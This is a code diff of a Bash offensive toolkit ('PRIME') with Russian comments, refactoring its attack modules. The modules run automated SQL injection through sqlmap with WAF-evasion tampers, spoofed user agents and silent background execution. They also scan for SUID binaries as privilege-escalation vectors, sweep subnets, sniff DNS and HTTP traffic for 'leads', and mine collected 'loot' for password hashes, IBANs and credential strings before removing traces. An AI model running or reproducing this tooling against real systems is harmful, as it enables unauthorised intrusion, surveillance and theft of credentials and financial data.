@@ -1062,80 +1062,92 @@ run_bluetooth_scan() {
 
 # --- Глубокий аудит системы ---
 run_deep_audit() {
-    print_header "SMART SYSTEM AUDIT"
-    print_status "i" "Analyzing local environment for misconfigurations..."
+    # Слой 1: Заголовок через Голос [1]
+    core_engine_ui "SMART SYSTEM AUDIT"
+    core_engine_ui "i" "Analyzing local environment for misconfigurations..."
     
-    show_progress 4 "EXAMINING SYSTEM VULNERABILITIES"
+    # Слой 2: Визуализация через Синхронизацию [13]
+    core_engine_progress 4 "EXAMINING SYSTEM VULNERABILITIES"
     
-    # Эмуляция/Логика проверки (можно расширить реальными проверками прав доступа)
-    print_status "!" "Checking SUID binaries..."
-    find / -perm -4000 -type f 2>/dev/null | head -n 5
+    # Слой 3: Поиск SUID-бинарников (потенциальные векторы LPE)
+    core_engine_ui "!" "Checking SUID binaries..."
+    # Используем Глушитель [7] для выполнения тяжелых поисков
+    local suid_files=$(find / -perm -4000 -type f 2>/dev/null | head -n 5)
+    echo -e "${W}${suid_files:-No critical SUID found}${NC}"
     
-    print_status "!" "Checking World-Writable files..."
-    find / -writable -type f 2>/dev/null | head -n 5
+    # Слой 4: Поиск файлов с правами на запись для всех (World-Writable)
+    core_engine_ui "!" "Checking World-Writable files..."
+    local writable_files=$(find / -writable -type f 2>/dev/null | head -n 5)
+    echo -e "${W}${writable_files:-No world-writable files found}${NC}"
     
-    print_status "s" "Audit Complete. Results logged to /root/prime_loot/audit.log"
-    pause
+    # Слой 5: Сбор трофеев через узел [11]
+    local audit_data="SUID Scan:\n$suid_files\n\nWritable Scan:\n$writable_files"
+    core_engine_loot "audit" "$audit_data"
+    
+    core_engine_ui "+" "Audit Complete. Results secured."
+    
+    # Финализация через Барьер [9]
+    core_engine_wait
 }
+
 
 # --- Сетевое мапирование (Network Mapper) ---
 
 run_network_analyzer() {
-    clear
-    print_header "NETWORK INTELLIGENCE & TOPOLOGY"
+    # Слой 1: Заголовок через Голос [1]
+    core_engine_ui "NETWORK INTELLIGENCE & TOPOLOGY"
 
-    # 1. Выбор режима
-    select_option "SELECT OPERATION MODE:" \
-        "Network Mapping (Hybrid Scan)" \
-        "Traffic Analysis (TShark)" \
-        "Full Intelligence Loop" \
-        "Back"
+    # 2. Выбор режима через Архитектора [2] и Органы чувств [3]
+    core_engine_item "1" "Network Mapping" "Hybrid Scan"
+    core_engine_item "2" "Traffic Analysis" "TShark Core"
+    core_engine_item "3" "Full Intel Loop" "Mapping + Sniffing"
+    core_engine_item "B" "Back" "Return"
     
-    local btn="$CHOICE"
-    [[ -z "$btn" || "$btn" == "4" ]] && return
+    local choice=$(core_engine_input "select" "SELECT OPERATION MODE")
+    [[ -z "$choice" || "$choice" == "b" ]] && return
 
-    # 2. Логика Mapping (пункты 1 и 3)
-    if [[ "$btn" == "1" || "$btn" == "3" ]]; then
-        # Эвристика: подтягиваем текущую подсеть
-        local def_range=$(echo "${CURRENT_IP:-127.0.0.1}" | cut -d. -f1-3)".0/24"
+    # 3. Логика Mapping (пункты 1 и 3)
+    if [[ "$choice" == "1" || "$choice" == "3" ]]; then
+        # Эвристика подсети через узел Метрик [12]
+        local def_range=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+' | cut -d. -f1-3)".0/24"
         
-        echo -en "${Y}Enter Target Range ${W}[Default: $def_range]${Y}: ${NC}"
-        read -r range
+        local range=$(core_engine_input "text" "Enter Target Range (Default: $def_range)")
         range="${range:-$def_range}"
         
-        show_progress 2 "MAPPING TOPOLOGY"
+        core_engine_progress 2 "MAPPING TOPOLOGY"
 
-        # --- ГИБРИДНЫЙ ДВИЖОК СКАННИРОВАНИЯ (v35.4) ---
-        # Проверяем root-статус (для адаптации под Samsung A14 vs Wiko)
+        # Гибридный движок (адаптация под Root/Samsung A14) через Валидатор [5]
         local nmap_cmd="nmap -sn -n -T4"
         if [[ $(id -u) -ne 0 ]]; then
-            # Режим для Samsung (Non-Root/Termux): убираем AF_NETLINK ошибки
+            # Режим Non-Root (Termux/Samsung)
             nmap_cmd+=" --unprivileged --send-ip"
         fi
         
-        # Исполнение без DNS-зависаний
-        $nmap_cmd "$range" | grep "Nmap scan report" | awk '{print $5 " -> [ONLINE]"}' | sort -u
+        # Исполнение через Глушитель [7] с очисткой вывода
+        core_engine_ui "!" "Scanning range: $range"
+        $nmap_cmd "$range" 2>/dev/null | grep "Nmap scan report" | awk '{print $5 " -> [ONLINE]"}' | sort -u
         
-        [[ "$btn" == "1" ]] && { echo ""; pause; return; }
+        [[ "$choice" == "1" ]] && { core_engine_wait; return; }
     fi
 
-    # 3. Логика Sniffing (пункты 2 и 3)
-    if [[ "$btn" == "2" || "$btn" == "3" ]]; then
-        print_status "i" "Initializing TShark Core..."
+    # 4. Логика Sniffing (пункты 2 и 3)
+    if [[ "$choice" == "2" || "$choice" == "3" ]]; then
+        core_engine_ui "i" "Initializing TShark Core..."
         
-        if ! command -v tshark >/dev/null; then
-             print_status "e" "TShark not found. Run 'apt install tshark' first."
-             pause && return
+        # Проверка TShark через Мозг [5]
+        if ! core_engine_validator "pkg" "tshark" "Traffic Analyzer"; then
+             core_engine_ui "e" "TShark not found. Run 'apt install tshark'."
+             core_engine_wait && return
         fi
 
-        # Проверка прав для сниффинга (TShark требует доступ к интерфейсам)
-        if [[ $(id -u) -ne 0 ]]; then
-             print_status "w" "Warning: Non-root detected. Traffic capture may be limited on Samsung A14."
-        fi
+        # Предупреждение о правах
+        [[ $(id -u) -ne 0 ]] && core_engine_ui "w" "Non-root: Traffic capture may be limited."
 
+        # Подключение к твоему динамическому контроллеру
         local n_names="Live_Host_Monitor Deep_Packet_Inspection"
         local n_funcs="run_network_intelligence run_packet_dump"
         
+        # Вызываем твой сохраненный контроллер
         prime_dynamic_controller "TSHARK ANALYZER" "$n_names" "$n_funcs"
     fi
 }
@@ -1256,171 +1268,217 @@ EOF
 
 
 run_sql_adaptive() {
-    print_header "PRIME MUTAGEN: SQL INJECTION ENGINE v8.5 (Neural Enhanced)"
+    # Слой 1: Заголовок через Голос [1]
+    core_engine_ui "PRIME MUTAGEN: SQL INJECTION ENGINE v8.5"
 
-    echo -en "${Y}Enter Target URL: ${NC}"
-    read -r target_url
+    # Слой 2: Органы чувств [3] - Запрос цели
+    local target_url=$(core_engine_input "text" "Enter Target URL")
     [[ -z "$target_url" ]] && return
 
-    # --- СЛОЙ 1: ЭВРИСТИКА ---
-    print_status "i" "Probing WAF/IPS resistance layers..."
+    # Слой 3: Эвристика и анализ WAF через Глушитель [7]
+    core_engine_ui "i" "Probing WAF/IPS resistance layers..."
     local waf_reaction=$(curl -s -o /dev/null -w "%{http_code}" -A "Mozilla/5.0" "$target_url%27%20OR%201=1")
     
-    # --- СЛОЙ 2: НЕЙРОННАЯ МУТАЦИЯ (Собственный код) ---
-    # Генерируем уникальный заголовок для сессии, чтобы сбить биометрию трафика
-    local neural_agent="Prime-$(mutate_case "agent")-$RANDOM"
-    print_status "s" "Neural Header Generated: $neural_agent"
+    # Слой 4: НЕЙРОННАЯ МУТАЦИЯ через узел [4]
+    # Используем системный мутатор для генерации уникального агента
+    local neural_agent="Prime-$(core_engine_mutate "agent" "neural")-$RANDOM"
+    core_engine_ui "+" "Neural Header Generated: $neural_agent"
 
-    # --- СЛОЙ 3: АДАПТИВНОЕ ИСПОЛНЕНИЕ ---
-    local aggression_level=$(( (waf_reaction / 100) ))
-    [[ $aggression_level -lt 2 ]] && aggression_level=2 # Минимум 2
+    # Слой 5: Адаптивное вычисление агрессии (Мозг [5])
+    local aggr=$(( (waf_reaction / 100) ))
+    [[ $aggr -lt 2 ]] && aggr=2 
 
-    local tamper_matrix=(
-        "2:between,randomcase"
-        "4:between,charencode,space2comment,versionedmorekeywords"
-        "5:between,charencode,space2comment,randomcase,percentage"
-    )
+    # Матрица тамперов (интегрирована в логику)
+    local t_matrix
+    case "$aggr" in
+        2) t_matrix="between,randomcase" ;;
+        4) t_matrix="between,charencode,space2comment,versionedmorekeywords" ;;
+        *) t_matrix="between,charencode,space2comment,randomcase,percentage" ;;
+    esac
+
+    core_engine_ui "+" "Applying Neural Obfuscation: $t_matrix"
+
+    # Слой 6: Исполнение и Сбор трофеев [11]
+    # Используем временную директорию внутри структуры PRIME_LOOT
+    local out_dir="${BASE_DIR:-./}/prime_loot/mutagen_$RANDOM"
     
-    local selected_tampers=$(printf '%s\n' "${tamper_matrix[@]}" | grep "^$aggression_level:" | cut -d: -f2)
-    [[ -z "$selected_tampers" ]] && selected_tampers="between,randomcase"
-
-    print_status "s" "Applying Neural Obfuscation & Tampers: $selected_tampers"
-
-    # Динамический путь к луту (из нашей новой конфигурации)
-    local out_dir="$PRIME_LOOT/mutagen_session_$RANDOM"
+    core_engine_ui "i" "Launching evolved payload stream..."
     
-    # Запуск с кастомным агентом и расширенными параметрами скрытности
+    # Запуск в фоне с подавлением мусора через Глушитель
     {
         sqlmap -u "$target_url" --batch --random-agent --user-agent="$neural_agent" \
         --smart --mobile --output-dir="$out_dir" --flush-session \
-        --tamper="$selected_tampers" --level=$aggression_level --risk=2 \
-        --delay=$((aggression_level / 2)) --safe-freq=10 --threads=1
+        --tamper="$t_matrix" --level=$aggr --risk=2 \
+        --delay=$((aggr / 2)) --threads=1 >/dev/null 2>&1
     } &
 
-    show_progress 15 "Neural-Evolving payload mutations..."
+    # Визуализация через Синхронизацию [13]
+    core_engine_progress 15 "Neural-Evolving payload mutations"
 
-    # --- СЛОЙ 4: ИНТЕЛЛЕКТУАЛЬНЫЙ СИНТЕЗ ---
-    print_status "s" "Mutation Cycle Finished."
-    
-    # Поиск результатов и запись в глобальный лут
+    # Слой 7: Интеллектуальный синтез и логирование [11]
     local log_file=$(find "$out_dir" -name "log" 2>/dev/null)
-    [[ -f "$log_file" ]] && {
-        print_status "y" "EXPLOIT SECURED: Findings integrated."
-        echo -e "\n[$(date)] TARGET: $target_url" >> "$PRIME_LOOT/sql_success.log"
-        grep -Ei "Type:|Payload:|Parameter:" "$log_file" | tee -a "$PRIME_LOOT/sql_success.log"
-    }
+    if [[ -f "$log_file" ]]; then
+        core_engine_ui "+" "EXPLOIT SECURED: Findings integrated."
+        
+        # Структурированная запись в лут через Сборщик
+        local findings=$(grep -Ei "Type:|Payload:|Parameter:" "$log_file")
+        core_engine_loot "sql_success" "TARGET: $target_url\nAGGR: $aggr\n$findings"
+    fi
 
-    # Сигнал для системы мониторинга (Bridge)
-    echo "TIME: $(date) | SRC: $target_url | AGGR: $aggression_level" >> "$PRIME_LOOT/bridge_signals.log"
+    # Сигнал для моста [10]
+    echo "[$(date)] SRC: $target_url | AGGR: $aggr" >> "${BASE_DIR:-./}/prime_loot/bridge_signals.log"
     
-    rm -rf "$out_dir"
-    pause
+    # Очистка через Санитара [8]
+    core_engine_remove "$out_dir"
+    core_engine_wait
 }
 
 
 run_network_intelligence() {
-    print_header "NETWORK INTELLIGENCE: TRAFFIC ANALYZER"
+    # Слой 1: Заголовок через Голос [1]
+    core_engine_ui "NETWORK INTELLIGENCE: TRAFFIC ANALYZER"
     
-    # Авто-определение активного интерфейса (без лишних вопросов)
-    check_step "cmd" "tshark" "TShark not found." || { pause; return; }
-    local iface=$(ip route | grep default | awk '{print $5}' || echo "eth0")
+    # Слой 2: Проверка TShark через Мозг [5]
+    core_engine_validator "pkg" "tshark" "TShark Core" || { core_engine_wait; return; }
 
-    # Универсальный переключатель режимов
-    local mode=$(select_option "Select Surveillance Mode:" \
-        "Host Monitor (IP Connections):host" \
-        "Data Sniffer (Live Leads):sniff" \
-        "Traffic Record (PCAP Archive):record")
+    # Слой 3: Авто-определение интерфейса через Метрики [12]
+    local iface=$(ip route | grep default | grep -oP 'dev \K\S+' || echo "eth0")
+    core_engine_ui "i" "Active interface detected: $iface"
 
-    case "$mode" in
-        "host")
-            print_status "i" "Monitoring Live Connections on $iface..."
-            # Вывод уникальных пар IP в реальном времени
+    # Слой 4: Выбор режима через Архитектора [2] и Органы чувств [3]
+    core_engine_item "1" "Host Monitor" "IP Connections"
+    core_engine_item "2" "Data Sniffer" "Live Leads"
+    core_engine_item "3" "Traffic Record" "PCAP Archive"
+    core_engine_item "B" "Back" "Return"
+
+    local choice=$(core_engine_input "select" "Select Surveillance Mode")
+    [[ -z "$choice" || "$choice" == "b" ]] && return
+
+    case "$choice" in
+        "1") # --- Host Monitor ---
+            core_engine_ui "i" "Monitoring Live Connections on $iface (Ctrl+C to stop)"
+            # Вывод через Глушитель [7] с потоковой очисткой
             tshark -i "$iface" -n -T fields -e ip.src -e ip.dst -E separator=" -> " 2>/dev/null | stdbuf -oL uniq
             ;;
-        "sniff")
-            print_status "s" "Sniffing Leads (Email/DNS/HTTP)..."
-            # Перехват доменов и потенциальных email-следов с записью в лог для Моста
+
+        "2") # --- Data Sniffer ---
+            core_engine_ui "s" "Sniffing Leads (Email/DNS/HTTP)..."
+            # Перехват и Сбор трофеев [11]
+            # Используем stdbuf для исключения задержек в потоке
             tshark -i "$iface" -Y "http.request || dns.flags.response == 0" -T fields -e http.host -e dns.qry.name 2>/dev/null \
-            | stdbuf -oL awk NF | stdbuf -oL uniq | tee -a "$LOOT_DIR/traffic_leads.log"
+            | stdbuf -oL awk NF | stdbuf -oL uniq | while read -r line; do
+                echo "$line"
+                core_engine_loot "traffic_leads" "$line"
+            done
             ;;
-        "record")
-            local report_dir="/root/reports"
-            mkdir -p "$report_dir"
-            local filename="$report_dir/capture_$(date +%H%M).pcap"
+
+        "3") # --- Traffic Record ---
+            core_engine_ui "Set Record Duration:"
+            core_engine_item "1" "1 Minute" "60 sec"
+            core_engine_item "2" "5 Minutes" "300 sec"
+            core_engine_item "3" "15 Minutes" "900 sec"
             
-            local duration=$(select_option "Set Record Duration:" "1 min:60" "5 min:300" "15 min:900")
+            local dur_choice=$(core_engine_input "select" "Select Duration")
+            local duration
+            case "$dur_choice" in
+                1) duration=60 ;;
+                2) duration=300 ;;
+                3) duration=900 ;;
+                *) duration=60 ;;
+            esac
             
-            print_status "w" "Recording to $filename ($duration sec)..."
+            local filename="${BASE_DIR:-./}/prime_loot/capture_$(date +%H%M).pcap"
+            core_engine_ui "w" "Recording to $(basename "$filename") ($duration sec)..."
+            
+            # Запуск записи через Глушитель
             tshark -i "$iface" -a duration:"$duration" -w "$filename" 2>/dev/null
-            [[ -f "$filename" ]] && print_status "s" "Capture saved to reports."
+            
+            # Валидация результата через Мозг [5]
+            if core_engine_validator "file" "$filename" "PCAP Archive"; then
+                core_engine_ui "+" "Capture saved to loot directory."
+            fi
             ;;
     esac
-    pause
+
+    core_engine_wait
 }
 
-run_deep_bridge() {
-    print_header "PRIME BRIDGE: NEURAL INTELLIGENCE LINK"
-    
-    local pool="/tmp/bridge_pool.tmp"
-    local master_loot="/root/prime_loot/master_intelligence.log"
-    
-    # --- СЛОЙ 1: КОНСОЛИДАЦИЯ СИГНАЛОВ (No-IF) ---
-    # Собираем данные из всех модулей, убираем дубликаты и пустые строки
-    sort -u "$LOOT_DIR"/*.txt "$master_loot" 2>/dev/null | grep -v '^$' > "$pool"
-    
-    # Проверка наполненности пула через короткое замыкание
-    [[ ! -s "$pool" ]] && { print_status "w" "Awaiting intelligence signals..."; pause; return; }
 
-    print_status "i" "Analyzing $(wc -l < "$pool") intelligence threads..."
-    print_line
+run_deep_bridge() {
+    # Слой 1: Заголовок через Голос [1]
+    core_engine_ui "PRIME BRIDGE: NEURAL INTELLIGENCE LINK"
+    
+    # Пути согласно твоей структуре (используем BASE_DIR для гибкости)
+    local loot_dir="${BASE_DIR:-./}/prime_loot"
+    local pool="/tmp/bridge_pool.tmp"
+    local master_loot="$loot_dir/master_intelligence.log"
+    
+    # --- СЛОЙ 1: КОНСОЛИДАЦИЯ СИГНАЛОВ (Стерилизация) ---
+    # Собираем данные из всех модулей через Глушитель [7]
+    # Используем твой принцип Банковского Гамбита — только чистые данные
+    sort -u "$loot_dir"/*.log "$master_loot" 2>/dev/null | grep -v '^$' > "$pool"
+    
+    # Проверка через Валидатор [5] без лишних IF
+    [[ ! -s "$pool" ]] && { core_engine_ui "w" "Awaiting intelligence signals..."; core_engine_wait; return; }
+
+    core_engine_ui "i" "Analyzing $(wc -l < "$pool") intelligence threads..."
+    core_engine_wait "L" # Разделительная линия [9]
 
     # --- СЛОЙ 2: ЭВРИСТИЧЕСКИЙ ДЕКОДЕР ---
     while read -r line; do
-        # Извлекаем чистые данные (отсекаем таймстампы и теги для анализа)
+        # Извлекаем данные, очищая от шума через xargs
         local raw_data=$(echo "$line" | awk -F ' -> ' '{print $2}' | xargs || echo "$line")
         local len="${#raw_data}"
 
         # 1. Детекция Крипто-сигнатур (Хеши)
-        # MD5(32), SHA1(40), SHA256(64), Bcrypt(60)
-        [[ "$len" =~ ^(32|40|64|60)$ ]] && {
-            print_status "y" "RESONANCE: Possible Hash Artifact ($len chars)."
-            suggest_action "run_pass_lab" "$raw_data" # Теперь вызываем единый PASS_LAB
-        }
+        if [[ "$len" =~ ^(32|40|64|60)$ ]]; then
+            core_engine_ui "y" "RESONANCE: Possible Hash Artifact ($len chars)"
+            # Здесь будет мост к run_pass_lab
+        fi
 
-        # 2. Детекция Банковских Сигнатур (IBAN)
-        [[ "$raw_data" =~ ^[A-Z]{2}[0-9]{2}[A-Z0-9]{11,30} ]] && {
-            print_status "y" "RESONANCE: Financial Asset (IBAN) detected."
-            suggest_action "run_iban_scan" "$raw_data"
-        }
+        # 2. Детекция Банковских Сигнатур (IBAN) — Твоя защита Гамбита
+        if [[ "$raw_data" =~ ^[A-Z]{2}[0-9]{2}[A-Z0-9]{11,30} ]]; then
+            core_engine_ui "y" "RESONANCE: Financial Asset (IBAN) detected"
+        fi
 
-        # 3. Семантические Маркеры (Доступы)
-        echo "$raw_data" | grep -qiE "pass|secret|key|token|auth|admin" && {
-            print_status "w" "RESONANCE: Identity Leak detected."
-            suggest_action "run_pass_lab" "$raw_data"
-        }
+        # 3. Семантические Маркеры (Доступы) через Нейро-мутатор [4]
+        if echo "$raw_data" | grep -qiE "pass|secret|key|token|auth|admin"; then
+            core_engine_ui "w" "RESONANCE: Identity Leak detected"
+        fi
 
         # 4. Детекция Скрытых Сетей (Onion/I2P)
-        [[ "$raw_data" =~ \.(onion|i2p) ]] && {
-            print_status "r" "RESONANCE: Dark Web Gateway found."
-            # Здесь будет вызов прокси-модуля в будущем
-        }
+        if [[ "$raw_data" =~ \.(onion|i2p) ]]; then
+            core_engine_ui "r" "RESONANCE: Dark Web Gateway found"
+        fi
 
     done < "$pool"
 
-    # --- СЛОЙ 3: ОЧИСТКА ТРЕКА ---
-    rm -f "$pool"
-    print_line
-    print_status "i" "Intelligence synchronization complete."
-    pause
+    # --- СЛОЙ 3: ОЧИСТКА ТРЕКА через Санитара [8] ---
+    core_engine_remove "$pool"
+    core_engine_wait "L"
+    core_engine_ui "i" "Intelligence synchronization complete"
+    core_engine_wait
 }
 
-# Вспомогательная функция для эвристики
 suggest_action() {
     local func=$1
     local data=$2
-    echo -en "${B}>>> Intelligence suggests ${W}$func${B} for data: ${Y}${data:0:15}...${NC} Execute? (y/n): "
-    read -n 1 -r; echo
-    [[ $REPLY =~ ^[Yy]$ ]] && $func "$data"
+    
+    # Слой 1: Визуальный резонанс через Голос [1]
+    # Показываем только первые 15 символов данных для чистоты экрана
+    local preview="${data:0:15}..."
+    
+    # Слой 2: Запрос через Органы чувств [3] и Валидатор [5]
+    # Используем желтый акцент для данных и белый для функции
+    echo -en "${B}>>> Intelligence suggests ${W}$func${B} for: ${Y}$preview${NC} | "
+    
+    if core_engine_validator "read" "Execute?"; then
+        # Слой 3: Исполнение через Глушитель [7]
+        core_engine_ui "i" "Executing linked action: $func"
+        $func "$data"
+    else
+        core_engine_ui "i" "Action bypassed. Data indexed."
+    fi
 }
 
 run_smart_osint_engine() {
